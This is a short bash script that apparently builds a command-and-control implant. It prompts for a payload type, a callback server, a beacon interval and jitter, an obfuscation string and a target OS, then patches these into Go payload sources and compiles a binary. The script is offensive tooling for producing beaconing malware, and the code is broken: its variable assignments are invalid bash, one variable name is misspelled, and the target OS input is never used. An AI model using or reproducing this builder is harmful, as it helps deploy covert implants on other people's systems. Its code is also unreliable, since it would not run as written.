#!/bin/bash

read -p 'Payload(tcp|web): ' payloadvar
read -p 'Server(include "http" and ":port"): ' servervar
read -p 'Interval(seconds): ' intervalvar
read -p 'Delta(seconds): ' deltavar
read -p 'Obfuscation text(random string): ' obftextvar
read -p 'Target OS(linux|windows): ' targetos
read -p 'Output binary name: ' outputbin
payloadpath = ""
echo "[+] Replacing variables..."
if [ $payloadvar == "tcp" ]
then
    $payloadpath = "petrie/petrie.go"
 
elif [ $payloadvar == "web" ]
then
    $payloadpath == "little_foot/little_foot.go"
 
else
    echo "unknown payload type"
    exit
fi

sed -i "s/&&SERV&&/${servervar}/g" $payloadpath
sed -i "s/&&INTERVAL&&/${intervalvar}/g" $payloadpath
sed -i "s/&&DELTA&&/${deltavarvar}/g" $payloadpath
sed -i "s/&&OBFTEXT&&/${obftextvar}/g" $payloadpath

echo "[+] Fetching package"

go get -u github.com/degenerat3/metcli

echo "[+] Building binary"

go build $payloadpath -o $outputbin